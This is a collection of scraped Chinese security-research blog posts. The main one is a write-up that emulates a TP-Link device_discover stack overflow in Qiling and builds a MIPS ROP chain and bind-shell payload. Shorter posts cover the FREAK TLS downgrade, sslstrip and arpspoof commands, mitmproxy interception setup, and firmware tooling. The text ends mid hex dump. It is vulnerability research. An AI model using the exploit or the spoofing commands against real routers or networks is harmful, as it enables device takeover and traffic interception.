[{"content":"[TOC]\n前段时间挖掘的一个栈溢出漏洞，最近准备用qiling仿真一下顺便写下exp，不过后面发现漏洞已经公开了。\n漏洞简要描述 device_discover 监听 udp端口5001, 处理接收到的数据。\n在数据处理函数protocol_packet_handle中，存在一些校验函数，会对数据进行初步的校验，校验方式基于对数据header特定字节的对比和checksum对比完成。header结构和checksum算法可以通过逆向解析，可以绕过该校验。\n在协议解析函数parse_discovery_frame，parse_advertisement_frame中会调用parse_msg_element 对数据进行解析。parse_msg_element 解析udp中数据时会调用copy_msg_element。\ncopy_msg_element函数中未对memcpy长度进行校验，导致栈溢出漏洞。\nint __fastcall copy_msg_element(int a1, void *a2, signed int a3) { if ( !a1 || !a2 || a3 \u0026lt; 0 ) return 1; memcpy(a2, (const void *)(a1 + 4), a3); return 0; } 使用qiling进行仿真 具体实现放在github 上 https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover\n大概需要hook 的一些点：\ndevice_discover 会 bind br0，这里可以patch 为 lo, 或者添加个虚拟网络接口 br0\npatch\nql.patch(0x0040BAC0, b\u0026#39;lo\\x00\u0026#39;) add br0\nsudo modprobe dummy sudo ip link add br0 type dummy sudo ip addr change dev br0 192.168.100.1 init_sock 内执行 setsockopt(sockfd1, 0xFFFF, 25, optval, 0x20u) 时会失败。\nEPERM 对应为No permissions. 索性直接把函数hook掉了\n[x] Can\u0026#39;t convert emu_optname 25 to host platform based optname [=] setsockopt(sockfd = 0x3, level = 0xffff, optname = 0x19, optval_addr = 0x7ff3cd7c, optlen = 0x20) = -0x1 (EPERM) device_discover binding interface:lo. [init_sock:377]: bind interface error. def my_setsockopt(ql: Qiling): print(\u0026#34;[+] Hooked setsockopt\u0026#34;) ql.os.set_api(\u0026#39;setsockopt\u0026#39;, my_setsockopt, QL_INTERCEPT.CALL) init_sock 执行完成后直接跳转到解析函数packet_handle\ndef hook_to_packet_handle(ql: Qiling): ql.arch.regs.write(\u0026#34;pc\u0026#34;, 0x00403978) after_initrsock_addr = 0x004038E8 ql.hook_address(hook_to_packet_handle,after_initrsock_addr) 把ioctl hijack 掉.\n后面存在对ioctl函数返回值的判断。\nif ( ioctl(a1, 0x8915u, a2) \u0026gt;= 0 ) { ... v15 = protocol_handler(a1, \u0026amp;bbuf_for_main, \u0026amp;v26); } def my_ioctl(ql: Qiling): print(\u0026#34;[+] Hooked ioctl\u0026#34;) return 0 ql.os.set_api(\u0026#39;ioctl\u0026#39;, my_ioctl,QL_INTERCEPT.CALL) 将 common_timer 函数hook掉\ncommon_timer 中涉及了一些广播包的发送，和数据接受处理逻辑无关，但是会触发sendto的PermissionError ，所以这里先直接绕过了\ncommon_timer() { ... send_discovery_frame(g_para, \u0026amp;bbuf_for_bcast); ... } def hook_common_timer(ql: Qiling): ql.arch.regs.write(\u0026#34;v0\u0026#34;,0x1) to_common_timer = 0x00403488 ql.hook_address(hook_common_timer,to_common_timer) 或者hijack掉sendto函数也行\ndef my_sendto(ql: Qiling): return 0 ql.os.set_api(\u0026#39;sendto\u0026#39;, my_sendto,QL_INTERCEPT.CALL) 完成上述步骤之后基本完成了对 device_discover 的仿真，设备会开启udp 端口5001，并对接受的数据进行解析。\n\u0026gt; lsof -i:5001 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME python3 381302 chiba 3u IPv4 638722 0t0 UDP localhost:5001 [+] bind(3,127.0.0.1:5001,16) = 0 [+] syscall bind host: 127.[+] recvfrom() CONTENT: [+] b\u0026#39;aaaaaaaaaa\\n\u0026#39; [+] recvfrom() addr is 127.0.0.1:496260.0.1 and port: 5001 sin_family: 2 如果单纯测试数据处理函数protocol_handler，那么可以直接跳转到protocol_handler进行仿真。\nexp 编写 具体见 https://github.com/chibataiki/IoT_emulating/blob/main/ql_tplink_device_discover/poc.py\n逆向协议结构 上面讲过，函数protocol_handler对输入的udp数据有校验和chksum，所以要先逆向出对应算法\nif ( !data || !a3 ) return 1; if ( *data != 1 ) return -1; v5 = data[1]; v6 = v5 == 0; v7 = v5 \u0026lt; 3; if ( v6 ) return -1; v6 = !v7; result = -1; if ( !v6 ) { result = -1; if ( data[2] == 0xE ) { v8 = data[11] | (data[10] \u0026lt;\u0026lt; 8); result = -1; if ( v8 \u0026lt; 0x5C1 ) { result = -1; if ( *((_DWORD *)data + 1) == 0xE12B83C7 ) 可以推测出大概的data 结构，其中tmp_chksum 和 tmp_len需要根据后面的tlv 数据生成\nheader = \u0026#34;01010e00e12b83c7\u0026#34; tmp_chksum = \u0026#34;0000\u0026#34; tmp_len = 0 padding = \u0026#34;0000\u0026#34; tlv data 数据校验逻辑：\nif ( *((_DWORD *)data + 1) == 0xE12B83C7 ) { data_len = tlv_data_len + 14; ptr = data; left_len = data_len; sum = 0; v13 = 0; do { v13 += 2; sum += *(unsigned __int16 *)ptr; ptr += 2; left_len -= 2; } while ( (int)(data_len - v13) \u0026gt;= 2 ); v14 = HIWORD(sum); if ( left_len != 1 ) goto LABEL_18; for ( sum += *ptr; ; sum = (unsigned __int16)sum + v14 ) { v14 = HIWORD(sum); LABEL_18: if ( !v14 ) break; } if ( (unsigned __int16)sum == 0xFFFF ) return ms_idle_handler(a1, data, 1, a3); 上面的 do while 和 for 函数的逻辑就是chksum 函数。\ndef csum(data): chksum_temp = 0 data_list = [data[i:i+4] for i in range(0, len(data), 4 ) ] for data in data_list: chksum_temp += int(data, 16) hiword_chksumm, loword_chksum = divmod(chksum_temp, 0x10000) chksum_temp = hiword_chksumm+loword_chksum chksum_fin = hex(chksum_temp ^ 0xffff) return chksum_fin 构造rop 确定 ra 的偏移\n使用pwntool的 cyclic\npayload = cyclic(1000, n=4) pwndbg\u0026gt; i r ra ra: 0x79616166 (\u0026#39;yaaf\u0026#39;) In [5]: cyclic_find(\u0026#34;yaaf\u0026#34;,n=4) Out[5]: 596 偏移是 596 个字节\ngadaget 1\n找出给 $a0赋值的指令\nPython\u0026gt;mipsrop.find(\u0026#34;li $a0,1\u0026#34;) --------------------------------------------- | Address | Action | Control Jump | --------------------------------------------- | 0x000512C0 | li $a0,1 | jalr $s1 | ... 第一个 gadaget， 将 $ra 值 指向 000512C0 + base addr\n.text:000512C0 li $a0, 1 .text:000512C4 move $t9, $s1 .text:000512C8 jalr $t9 ; sub_50FC0 gadaget 2\n由于 $s1 寄存器可控，所以第二个gadget 会执行 sleep 函数, 但是为了下一个 gadget，所以需要控制 $ra。\nPython\u0026gt;mipsrop.tail() --------------------------------------------- | Address | Action | Control Jump | --------------------------------------------- | 0x00035348 | move $t9,$s2 | jr $s2 ... 可以看到下面的$ra的值可以从栈上获取，且$s2 也可以控制\n.text:00035348 move $t9, $s2 .text:0003534C lw $ra, 0x18+var_sC($sp) .text:00035350 lw $s2, 0x18+var_s8($sp) .text:00035354 lw $s1, 0x18+var_s4($sp) .text:00035358 lw $s0, 0x18+var_s0($sp) .text:0003535C jr $t9 ; 由于需要执行sleep 函数 ，所以 $s2的值设置为sleep 函数地址 000500F0 + base addr\ngadget 3\n上面已经执行完sleep(), 并控制了新的 $ra，所以需要找一个将从stack中取值的的gadget\nPython\u0026gt;mipsrop.stackfinder() --------------------------------------------- | Address | Action | Control Jump | --------------------------------------------- | 0x000305B0 | addiu $s3,$sp,0x30+var_18 | jalr $s4 ... 其中 $s3 从栈上获取，对应的就是栈上的shellcode 地址 ，且 $s4 可控。\n.text:000305B0 addiu $s3, $sp, 0x30+var_18 .text:000305B4 move $a0, $s3 .text:000305B8 move $t9, $s4 .text:000305BC jalr $t9 ; .text:000305C0 move $a1, $s1 gadget 4\n上面可以看到 $s3 指向了shellcode 地址，那么 $s4 指向的gadget 就需要执行$s3\nPython\u0026gt;mipsrop.find(\u0026#34;move $t9, $s3\u0026#34;) --------------------------------------------- | Address | Action | Control Jump | --------------------------------------------- | 0x0000B5F0 | move $t9,$s3 | jalr $s3 ... .text:0000B5F0 move $t9, $s3 .text:0000B5F4 jalr $t9 .text:0000B5F8 move $a1, $s0 这里$s4 就为 0x000B5F0 + base addr\ngadget chain\nshellcode = asm(shellcraft.mips.linux.bindsh(2334)) libc_addr = 0x90063000 addr1 = 0x000512C0 addr2 = 0x00035348 addr_sleep = 0x000500F0 addr3 = 0x000305B0 addr4 = 0x0000B5F0 s1 = p32(libc_addr + addr2 ) s2 = p32(libc_addr + addr_sleep) s3 = b\u0026#34;BBBB\u0026#34; s4 = p32(libc_addr + addr4) ra = p32(libc_addr+addr1) payload = b\u0026#34;A\u0026#34;*580 + s1 + s2 + s3 + s4 + ra + b\u0026#34;A\u0026#34;*36 + p32(libc_addr+addr3)+ b\u0026#34;D\u0026#34;*24+shellcode 效果 暂时需要使用 qiling 的debug模式，结合gdb ，忽视掉一些\nunicorn.unicorn.UcError: Invalid memory write (UC_ERR_WRITE_UNMAPPED) 问题。\n已经执行到shellcode里了，但是有点小问题。\n[+] bind(5,127.0.0.1:2334,16) = 0 [+] syscall bind host: 127.0.0.1 and port: 2334 sin_family: 2 ... [+] write() CONTENT: b\u0026#39;ls\u0026#39; [+] write() CONTENT: b\u0026#39;Permission denied\u0026#39; \u0026gt; lsof -i:2334 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME python3 417496 chiba 13u IPv4 695587 0t0 TCP localhost:2334 (LISTEN) python3 417496 chiba 14u IPv4 695588 0t0 TCP localhost:2334-\u0026gt;localhost:43394 (ESTABLISHED) $ nc 127.0.0.1 2334 exit 130 ls sh: ls: Permission denied pwd / help Built-in commands: ------------------- . : alias bg break cd chdir continue eval exec exit export false fg hash help jobs kill let local pwd read readonly return set shift times trap true type ulimit umask unalias unset wait https://github.com/77clearlove/TP-Link-poc\nhttps://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover\nhttps://gsec.hitb.org/materials/sg2015/whitepapers/Lyon%20Yang%20-%20Advanced%20SOHO%20Router%20Exploitation.pdf\n","permalink":"https://chibataiki.github.io/posts/emulate_iot_programs_with_qiling_1/","summary":"[TOC]\n前段时间挖掘的一个栈溢出漏洞，最近准备用qiling仿真一下顺便写下exp，不过后面发现漏洞已经公开了。\n漏洞简要描述 device_discover 监听 udp端口5001, 处理接收到的数据。\n在数据处理函数protocol_packet_handle中，存在一些校验函数，会对数据进行初步的校验，校验方式基于对数据header特定字节的对比和checksum对比完成。header结构和checksum算法可以通过逆向解析，可以绕过该校验。\n在协议解析函数parse_discovery_frame，parse_advertisement_frame中会调用parse_msg_element 对数据进行解析。parse_msg_element 解析udp中数据时会调用copy_msg_element。\ncopy_msg_element函数中未对memcpy长度进行校验，导致栈溢出漏洞。\nint __fastcall copy_msg_element(int a1, void *a2, signed int a3) { if ( !a1 || !a2 || a3 \u0026lt; 0 ) return 1; memcpy(a2, (const void *)(a1 + 4), a3); return 0; } 使用qiling进行仿真 具体实现放在github 上 https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover\n大概需要hook 的一些点：\ndevice_discover 会 bind br0，这里可以patch 为 lo, 或者添加个虚拟网络接口 br0\npatch\nql.patch(0x0040BAC0, b\u0026#39;lo\\x00\u0026#39;) add br0\nsudo modprobe dummy sudo ip link add br0 type dummy sudo ip addr change dev br0 192.","title":"Emulate_iot_programs_with_qiling_1"},{"content":"Collect some firmware emulation tools. Add some more analysis later.\n[TOC]\nQEMU user mode system mode Firmadyne https://github.com/firmadyne/firmadyne a research-paper project FirmAE https://github.com/pr0v3rbs/FirmAE EMUX (formerly ARMX) https://github.com/therealsaumil/emux Firmware Analysis Toolkit https://github.com/attify/firmware-analysis-toolkit Qiling https://github.com/qilingframework/qiling unicorn https://github.com/unicorn-engine/unicorn basesafe https://github.com/fgsect/BaseSAFE a research-paper project FirmWire https://github.com/FirmWire/FirmWire.git for smartphone baseband firmwares usercore https://github.com/lunixbochs/usercorn no more commits since 20 Mar 2019 binee https://github.com/carbonblack/binee no more commits since 15 Jun 2020 ","permalink":"https://chibataiki.github.io/posts/firmware_emulation_tools/","summary":"Collect some firmware emulation tools. Add some more analysis later.\n[TOC]\nQEMU user mode system mode Firmadyne https://github.com/firmadyne/firmadyne a research-paper project FirmAE https://github.com/pr0v3rbs/FirmAE EMUX (formerly ARMX) https://github.com/therealsaumil/emux Firmware Analysis Toolkit https://github.com/attify/firmware-analysis-toolkit Qiling https://github.com/qilingframework/qiling unicorn https://github.com/unicorn-engine/unicorn basesafe https://github.com/fgsect/BaseSAFE a research-paper project FirmWire https://github.com/FirmWire/FirmWire.git for smartphone baseband firmwares usercore https://github.com/lunixbochs/usercorn no more commits since 20 Mar 2019 binee https://github.com/carbonblack/binee no more commits since 15 Jun 2020 ","title":"Firmware emulation tools"},{"content":"0x00 前研 参加了 “雷克沙杯”HL260s移动硬盘破解挑战赛，记录一下整个过程。\n0x01 SSD 组成部分 包含存储芯片部分和USB-to-SATA 转接器两个部分。\n存储芯片部分包含4片 longsys 128GB 存储，一共512GB\n桥接器芯片正面，包含一个 SOP8的SPI-flash， 另一个芯片不清楚。\n​\t反面包含一颗 SATA-to-USB 桥接器芯片。\n0x02 flash 固件 分析 提取后包含部分 USB descriptor 明文信息和加密固件\nUSB descriptor:\n​\t可以得出bridge controller 为 Initio INIC-3638\n​\t结合芯片信息 符合lexar 相关介绍，但是没有对应datasheet\n​\n剩下部分为加密固件\n0x03 读取分区 使用lexar 原装的 usb-to-sata bridge，可以发现只能识别256GB的块区\nusb 2-4.3: New USB device found, idVendor=21c4, idProduct=b061, bcdDevice= 3.06 usb 2-4.3: New USB device strings: Mfr=1, Product=2, SerialNumber=3 usb 2-4.3: Product: HL260S usb 2-4.3: Manufacturer: Lexar usb 2-4.3: SerialNumber: 21212512172104B usb-storage 2-4.3:1.0: USB Mass Storage device detected scsi host5: usb-storage 2-4.3:1.0 scsi 5:0:0:0: Direct-Access Lexar HL260S 0306 PQ: 0 ANSI: 6 使用第三方usb-to-sata bridge, 可以识别512GB\nusb 2-3: New USB device found, idVendor=152d, idProduct=2590, bcdDevice=81.05 usb 2-3: New USB device strings: Mfr=1, Product=2, SerialNumber=3 usb 2-3: Product: Seatay Generic USB Device usb 2-3: Manufacturer: Seatay USB to ATA/ATAPI Brid usb 2-3: SerialNumber: 00A123459ADF scsi host5: uas scsi 5:0:0:0: Direct-Access Seatay SBOX02503 8105 PQ: 0 ANSI: 6 sd 5:0:0:0: Attached scsi generic sg4 type 0 sd 5:0:0:0: [sdd] Spinning up disk... ......ready sd 5:0:0:0: [sdd] 1000215216 512-byte logical blocks: (512 GB/477 GiB) sd 5:0:0:0: [sdd] 4096-byte physical blocks 可以看到加密分区被识别为Unpartitioned space\nfdisk Disk /dev/sdd: 476.94 GiB, 512110190592 bytes, 1000215216 sectors Disk model: SBOX02503 Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 4096 bytes I/O size (minimum/optimal): 4096 bytes / 4096 bytes Disklabel type: dos Disk identifier: 0x2e6de77c Device Boot Start End Sectors Size Id Type /dev/sdd1 2048 500107607 500105560 238.5G 7 HPFS/NTFS/exFAT Command (m for help): F Unpartitioned space /dev/sdd: 238.47 GiB, 256054222848 bytes, 500105904 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 4096 bytes Start End Sectors Size 500109312 1000215215 500105904 238.5G 此时已经可以通过dd读取加密分区加密后的数据，但是没什么用，尝试直接dd写入但是数据没变。\n0x04 filedog 接口测试 使用逻辑分析仪采样了插入普通U盘和不插时的数据对比，有点区别但是没有进一步分析\n有一定规律\n0x05漏洞 ： 对加密分区部分可进行数据写入 使用第三方USB-to-SATA bridge可以通过fdisk和mkfs 格式化整个设备\n原加密分区数据全都被覆盖了\n但是由于提交时间晚了，痛失3k。\n之前没格式化时dd写入数据失败，一旦格式化之后，好像数据都没了，这也是没有一开始格式化的原因。\n0x06 总结 对于SSD漏洞挖掘完全是从0开始的，有些芯片都不认识。\n而且可以提前购买lexar的另外一款加密一点硬盘进行测试，这次的测试没有给filedog，因此也不清楚里面key的结构，不清楚用处大不大。\n直接尝试格式化进行加密分区写入，说不定漏洞就拿到手了,但是可能就无法测试其他漏洞了。\n","permalink":"https://chibataiki.github.io/posts/ssd%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/","summary":"0x00 前研 参加了 “雷克沙杯”HL260s移动硬盘破解挑战赛，记录一下整个过程。\n0x01 SSD 组成部分 包含存储芯片部分和USB-to-SATA 转接器两个部分。\n存储芯片部分包含4片 longsys 128GB 存储，一共512GB\n桥接器芯片正面，包含一个 SOP8的SPI-flash， 另一个芯片不清楚。\n​\t反面包含一颗 SATA-to-USB 桥接器芯片。\n0x02 flash 固件 分析 提取后包含部分 USB descriptor 明文信息和加密固件\nUSB descriptor:\n​\t可以得出bridge controller 为 Initio INIC-3638\n​\t结合芯片信息 符合lexar 相关介绍，但是没有对应datasheet\n​\n剩下部分为加密固件\n0x03 读取分区 使用lexar 原装的 usb-to-sata bridge，可以发现只能识别256GB的块区\nusb 2-4.3: New USB device found, idVendor=21c4, idProduct=b061, bcdDevice= 3.06 usb 2-4.3: New USB device strings: Mfr=1, Product=2, SerialNumber=3 usb 2-4.3: Product: HL260S usb 2-4.","title":"SSD漏洞挖掘从入门到放弃"},{"content":"伦敦交通图的最初几个版本很复杂，包含了很多要素:\n河流，公园，树木，道路等等，很精确但是要素过多。乘坐地铁的人们显然更加在意如何从一个地铁站到达另一个地铁站。\nHarry Beck 设计的地铁图：\n三种方向： 上下，左右，以及斜45度。将复杂的地图简化为清晰的几何。在协调一致和特殊要求直接找到了一个很好的平衡。也成为了现代地铁示意图的典范。\nreferer:\nhttps://www.ted.com/talks/michael_bierut_the_genius_of_the_london_tube_map/transcript?language=en\u0026amp;referrer=playlist-small_thing_big_idea#t-67176\n《设计，无处不在》\n","permalink":"https://chibataiki.github.io/posts/the-design-of-metro-map/","summary":"伦敦交通图的最初几个版本很复杂，包含了很多要素:\n河流，公园，树木，道路等等，很精确但是要素过多。乘坐地铁的人们显然更加在意如何从一个地铁站到达另一个地铁站。\nHarry Beck 设计的地铁图：\n三种方向： 上下，左右，以及斜45度。将复杂的地图简化为清晰的几何。在协调一致和特殊要求直接找到了一个很好的平衡。也成为了现代地铁示意图的典范。\nreferer:\nhttps://www.ted.com/talks/michael_bierut_the_genius_of_the_london_tube_map/transcript?language=en\u0026amp;referrer=playlist-small_thing_big_idea#t-67176\n《设计，无处不在》","title":"The Design of Metro Map"},{"content":"introduction FREAK:(Factoring RSA Export Keys ) 在SSL/TLS协议中存在一种漏洞,允许中间人将ciphersuite中的RSA强度降低为EXPORT-grade(出口级别).\n早期由于二战的因素,许多国家出于国家安全因素的考虑,从而限制加密技术的出口;美国政府对出口的加密算法存在限制, 根据法律将出口的RSA密钥长度减少为512bits.而512bit的RSA密钥解密的代价很小,允许美国可以解密国外的加密通讯.\n受漏洞影响的相关库:\nOpenSSL :CVE-2015-0204 1.0.1-1.0.1j, 1.0.0-1.0.0o,0.9.8-0.9.8zc BoringSSL: versions before Nov 10, 2014 are vulnerable \u0026hellip; 在 OpenSSL 库中，s3_clnt.c 文件中的 ssl3_get_key_exchange 函数允许客户端使用弱RSA密钥对。攻击者可拦截受影响的客户端与服务器之间的HTTPS连接，并强制其使用弱加密。\npatch部分: https://github.com/openssl/openssl/commit/ce325c60c74b0fa784f5872404b722e120e5cab0\n攻击流程 client在发送的client hello中使用标准的RSA加密请求 MITM 劫持client hello,并将cipher suite 更改为 export-grade RSA,比如TLS_RSA_EXPORT_WITH_RC4_MD5,并传给server server在ServerCertificate中发送2048bits的公钥，接受export级别的cipher suite,并临时生成512bit的RSA公钥, 通过发送ServerKeyExchange message通知client,并使用证书的密钥对公钥进行签名 client端接受消息,验证证书, 生成 premaster key并通过server端的公钥进行加密 mitm attacker需要将512bit的公钥进行因数分解获得临时私钥, mitm 此时可以从clientkeyexchange中解密出pre-master secret 成功解密后attacker可以明文查看所有信息 检测方式:\n服务端:\nopenssl s_client -connect [server ip] -cipher EXPORT 客户端 https://clienttest.ssllabs.com:8443/ssltest/viewMyClient.html 实验 使用 netfilterqueue 能够劫持TLS/SSL 握手包，可以通过scapy对数据包进行过滤和修改，可以将ciphersuite 更换为自己想要的版本\n问题： SSLv3以及之后的TLS会对消息进行一个完整性校验，修改ciphersuite的话密钥协商过程最后的Finish会校验失败，大概思路是解密出master key之后重新构造一下最后的Finish包。todo\nreferer:\nhttps://en.wikipedia.org/wiki/FREAK https://lbarman.ch/blog/downgrade-tls/ https://medium.com/@c0D3M/freak-attack-explained-3048ab9d3f30 https://mitls.org/pages/attacks/SMACK https://www.openssl.org/news/vulnerabilities.html\n","permalink":"https://chibataiki.github.io/posts/freak/","summary":"introduction FREAK:(Factoring RSA Export Keys ) 在SSL/TLS协议中存在一种漏洞,允许中间人将ciphersuite中的RSA强度降低为EXPORT-grade(出口级别).\n早期由于二战的因素,许多国家出于国家安全因素的考虑,从而限制加密技术的出口;美国政府对出口的加密算法存在限制, 根据法律将出口的RSA密钥长度减少为512bits.而512bit的RSA密钥解密的代价很小,允许美国可以解密国外的加密通讯.\n受漏洞影响的相关库:\nOpenSSL :CVE-2015-0204 1.0.1-1.0.1j, 1.0.0-1.0.0o,0.9.8-0.9.8zc BoringSSL: versions before Nov 10, 2014 are vulnerable \u0026hellip; 在 OpenSSL 库中，s3_clnt.c 文件中的 ssl3_get_key_exchange 函数允许客户端使用弱RSA密钥对。攻击者可拦截受影响的客户端与服务器之间的HTTPS连接，并强制其使用弱加密。\npatch部分: https://github.com/openssl/openssl/commit/ce325c60c74b0fa784f5872404b722e120e5cab0\n攻击流程 client在发送的client hello中使用标准的RSA加密请求 MITM 劫持client hello,并将cipher suite 更改为 export-grade RSA,比如TLS_RSA_EXPORT_WITH_RC4_MD5,并传给server server在ServerCertificate中发送2048bits的公钥，接受export级别的cipher suite,并临时生成512bit的RSA公钥, 通过发送ServerKeyExchange message通知client,并使用证书的密钥对公钥进行签名 client端接受消息,验证证书, 生成 premaster key并通过server端的公钥进行加密 mitm attacker需要将512bit的公钥进行因数分解获得临时私钥, mitm 此时可以从clientkeyexchange中解密出pre-master secret 成功解密后attacker可以明文查看所有信息 检测方式:\n服务端:\nopenssl s_client -connect [server ip] -cipher EXPORT 客户端 https://clienttest.ssllabs.com:8443/ssltest/viewMyClient.html 实验 使用 netfilterqueue 能够劫持TLS/SSL 握手包，可以通过scapy对数据包进行过滤和修改，可以将ciphersuite 更换为自己想要的版本","title":"FREAK"},{"content":"sslstrip is a MITM tool.\nhow it works People may not type https:// (http://) in the address bar.\noffen encouter SSL with this two types:\n301/302 redirection click links with https:// sslstrip can watch http traffic and change all https links to http\narpspoof send ARP messages on LAN associate the attacker\u0026rsquo;s Mac address with the gateway ip, then all traffic will send too attacker\u0026rsquo;s machine\nsudo arpspoof -i [interface] -t [target mac] -r [gataway mac] traffic redirect sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 referer:\nhttps://github.com/moxie0/sslstrip https://www.youtube.com/watch?v=MFol6IMbZ7Y\nhttps://en.wikipedia.org/wiki/ARP_spoofing\n","permalink":"https://chibataiki.github.io/posts/sslstrip-use-note/","summary":"sslstrip is a MITM tool.\nhow it works People may not type https:// (http://) in the address bar.\noffen encouter SSL with this two types:\n301/302 redirection click links with https:// sslstrip can watch http traffic and change all https links to http\narpspoof send ARP messages on LAN associate the attacker\u0026rsquo;s Mac address with the gateway ip, then all traffic will send too attacker\u0026rsquo;s machine\nsudo arpspoof -i [interface] -t [target mac] -r [gataway mac] traffic redirect sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 referer:","title":"Sslstrip Use Note"},{"content":"一般而言,直接看官方文档就能解决很多问题, 但是实际测试中还是踩了很多坑,所以记录一下\n环境: ubuntu 20.04\n安装 坑: pip安装存在问题, 需要pipx\nhow mitm works https://docs.mitmproxy.org/stable/concepts-howmitmproxyworks/\ncertificate 安装mitmproxy的时候会在 .mitmproxy中默认生产很多认证相关的文件. ubuntu需要手动信任一下\n放到/usr/share/ca-certificates目录下 sudo dpkg-reconfigure ca-certificates 流量转发 开启转发:\nsysctl -w net.ipv4.ip_forward=1 sysctl -w net.ipv6.conf.all.forwarding=1 关闭 ICMP包的转发\nsysctl -w net.ipv4.conf.all.send_redirects=0 流量转发存在很多形式: https://docs.mitmproxy.org/stable/concepts-modes/\n这里讲一下 Transparent的相关问题\n选择本地转发的话: 直接iptables 转发流量会遇到的一个问题就是循环转发 iptables -t nat -A OUTPUT -p tcp -dport 80 -j REDIRECT --to-port 8080 这里8080是mitmproxy的代理端口, 所有出去的流量都会转发到8080,但是mitmproxy也需要访问80端口.\n所以一个解决方案是新建一个用户mitmproxyuser,让它执行mitmproxy, 然后iptables设置一下不要过滤用户:mitmproxyuser,就可以解决流量循环转发的问题\nsudo useradd mitmproxyuser passwd mitmproxyuser iptables -t nat -A OUTPUT -p tcp -m owner ! --uid-owner mitmproxyuser -m multiport --dports 80,443 -j REDIRECT --to-port 8080 开启 mitmproxy su - mitmproxyuser mitmproxy --mode transparent --showhost --set block_global=false -k -s [script] referer:\nhttps://docs.mitmproxy.org/stable/\n","permalink":"https://chibataiki.github.io/posts/mitmproxy-use-note/","summary":"一般而言,直接看官方文档就能解决很多问题, 但是实际测试中还是踩了很多坑,所以记录一下\n环境: ubuntu 20.04\n安装 坑: pip安装存在问题, 需要pipx\nhow mitm works https://docs.mitmproxy.org/stable/concepts-howmitmproxyworks/\ncertificate 安装mitmproxy的时候会在 .mitmproxy中默认生产很多认证相关的文件. ubuntu需要手动信任一下\n放到/usr/share/ca-certificates目录下 sudo dpkg-reconfigure ca-certificates 流量转发 开启转发:\nsysctl -w net.ipv4.ip_forward=1 sysctl -w net.ipv6.conf.all.forwarding=1 关闭 ICMP包的转发\nsysctl -w net.ipv4.conf.all.send_redirects=0 流量转发存在很多形式: https://docs.mitmproxy.org/stable/concepts-modes/\n这里讲一下 Transparent的相关问题\n选择本地转发的话: 直接iptables 转发流量会遇到的一个问题就是循环转发 iptables -t nat -A OUTPUT -p tcp -dport 80 -j REDIRECT --to-port 8080 这里8080是mitmproxy的代理端口, 所有出去的流量都会转发到8080,但是mitmproxy也需要访问80端口.\n所以一个解决方案是新建一个用户mitmproxyuser,让它执行mitmproxy, 然后iptables设置一下不要过滤用户:mitmproxyuser,就可以解决流量循环转发的问题\nsudo useradd mitmproxyuser passwd mitmproxyuser iptables -t nat -A OUTPUT -p tcp -m owner !","title":"Mitmproxy Use Note"},{"content":"Ghidra plugin for ida ghidra包含了一些用于IDA的插件: 位于 ${GHIDRA_DIR}/Extensions/IDAPro/Python/\nmac下插件位置: /Users/$USER/.idapro/plugins/\nxml_exporter.py: 1.a plugin to export an IDA database as an XML file.\n2.Place in the IDA plugins folder.\nxml_loader.py 1.an IDA loader to build a new database using an XML file.\n2.It loads the .bytes file and builds the IDA database using the contents of the XML file.\n3.NOTE: Currently, the loader does not support importing memory overlays or Harvard architectures (e.g., 8051).\n4.Place in the IDA loaders folder.\nxml_importer.py 1.a plugin to add data from an XML file to an existing database.\n2.It will NOT load any binary data from the bytes file.\n3.It will add symbols, comments, code, data, functions, etc. for addresses that currently exist in the database.\n4.Place in the IDA plugins folder.\nidaxml.py module 1.A require import for the xml_exporter, xml_importer, and xml_loader.\n2.Place in the IDA python folder. mac: xxx/ida.app/Contents/MacOS/python\nreferer:\nhttps://revers3c.blogspot.com/2019/04/import-ida-pro-database-into-ghidra.html\n${GHIDRA_DIR}/Extensions/IDAPro/Python/{6,7}xx/README.html\n","permalink":"https://chibataiki.github.io/posts/ghidra-usage-note/","summary":"Ghidra plugin for ida ghidra包含了一些用于IDA的插件: 位于 ${GHIDRA_DIR}/Extensions/IDAPro/Python/\nmac下插件位置: /Users/$USER/.idapro/plugins/\nxml_exporter.py: 1.a plugin to export an IDA database as an XML file.\n2.Place in the IDA plugins folder.\nxml_loader.py 1.an IDA loader to build a new database using an XML file.\n2.It loads the .bytes file and builds the IDA database using the contents of the XML file.\n3.NOTE: Currently, the loader does not support importing memory overlays or Harvard architectures (e.","title":"Ghidra Usage Note"},{"content":"对于IDA不能识别的二进制文件, 可以选择作为binary file 进行加载.\n需要:\n手动设置CPU架构 手动设置加载基址 一旦IDA加载了文件,那么首先做的就是在最开头按下c, 将其转为code.\nIDA会将二进制文件的bytes转为code然后进行分析, 但是任然会存在很多没有解析的code.\n自动分析binary file 从固件中找到对应的符号文件, 使用IDApython进行符号的修复\nTODO referer:\nhttp://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/\n","permalink":"https://chibataiki.github.io/posts/ida_usage_note/","summary":"对于IDA不能识别的二进制文件, 可以选择作为binary file 进行加载.\n需要:\n手动设置CPU架构 手动设置加载基址 一旦IDA加载了文件,那么首先做的就是在最开头按下c, 将其转为code.\nIDA会将二进制文件的bytes转为code然后进行分析, 但是任然会存在很多没有解析的code.\n自动分析binary file 从固件中找到对应的符号文件, 使用IDApython进行符号的修复\nTODO referer:\nhttp://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/","title":"IDA_usage_note"},{"content":"文件系统的提取 看第一篇参考文献的时候,尝试了下,找到了Tp_Link_wr886nv6的固件.\nbinwalk 扫描结果:\n考虑到wr886nv6的内存空间, 这个解压大小2M左右的lzma压缩文件就可能比较有意思.\n但是根据binwalk的两个文件初始位置进行分割会有点小问题,所以需要通过hex查看一下真实的有效数据是多大. 类似于这样: 真实数据到 0x00b6b2就结束了\n000b6280: 500f 1765 1fee 46eb f9ca c213 2911 9afe P..e..F.....)... 000b6290: 3930 5afb 6f5c 6563 9742 d169 